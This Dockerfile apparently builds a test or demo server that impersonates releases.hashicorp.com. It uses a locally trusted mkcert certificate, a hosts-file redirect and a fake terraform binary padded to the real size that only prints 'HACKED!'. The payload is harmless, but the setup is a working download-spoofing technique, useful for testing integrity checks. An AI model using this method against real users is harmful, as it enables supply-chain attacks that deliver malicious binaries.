FROM nginx:alpine

RUN apk add --no-cache bash nss zip \
  && wget https://github.com/FiloSottile/mkcert/releases/download/v1.4.3/mkcert-v1.4.3-linux-amd64 -O /usr/local/bin/mkcert \
  && chmod a+x /usr/local/bin/mkcert \
  && mkcert -install \
  && mkcert -cert-file=/etc/ssl/private/cert.crt -key-file /etc/ssl/private/cert.key \
    releases.hashicorp.com "*.releases.hashicorp.com" localhost 127.0.0.1 ::1 \
  && echo 'echo "===== HACKED! ====="' > /tmp/terraform \
  && echo 'exit 0' >> /tmp/terraform \
  && chmod a+x /tmp/terraform \
  # Download the real archive to have almost the same size
  && wget https://releases.hashicorp.com/terraform/0.14.7/terraform_0.14.7_linux_amd64.zip -O - >> /tmp/terraform \
  && cd /tmp && zip /usr/share/nginx/html/terraform.zip ./terraform \
  && rm -f /tmp/* /tmp/.terraform \
  && echo "echo '127.0.0.1    releases.hashicorp.com' >> /etc/hosts" > /docker-entrypoint.d/40-custom-hosts.sh \
  && chmod a+x /docker-entrypoint.d/40-custom-hosts.sh
COPY default.conf /etc/nginx/conf.d/default.conf
